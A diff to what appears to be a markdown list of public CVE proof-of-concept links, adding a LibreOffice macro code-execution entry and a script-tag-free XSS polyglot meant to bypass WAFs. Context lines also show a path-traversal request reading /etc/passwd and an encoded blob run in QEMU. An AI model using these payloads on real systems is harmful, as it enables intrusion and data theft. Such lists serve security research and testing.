@@ -150,6 +150,7 @@ Some CVEs PoCs repos on github or internet.
 - Social Network Tabs Wordpress Plugin Vulnerability: [CVE-2018-20555](https://github.com/fs0c131y/CVE-2018-20555)
 - ES File Explorer Open Port Vulnerability: [CVE-2019-6447](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)
 - Atlassian Jira vulnerable: [CVE-2017-9506](https://github.com/random-robbie/Jira-Scan)
+- Libreoffice - Remote Code Execution via Macro/Event execution: [CVE-2018-16858](https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html)
 
 '''bash
 $ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
@@ -160,6 +161,14 @@ $ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | ba
 ```bash
 GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
 ```
+
+- Web/Javscript/WAF [Payload will run in a lot of contexts](): Short but lethal. No script tags, thus bypassing a lot of WAF and executes in multiple environments.
+
+
+```javascript
+javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+```
+
 
 ## Additions
 
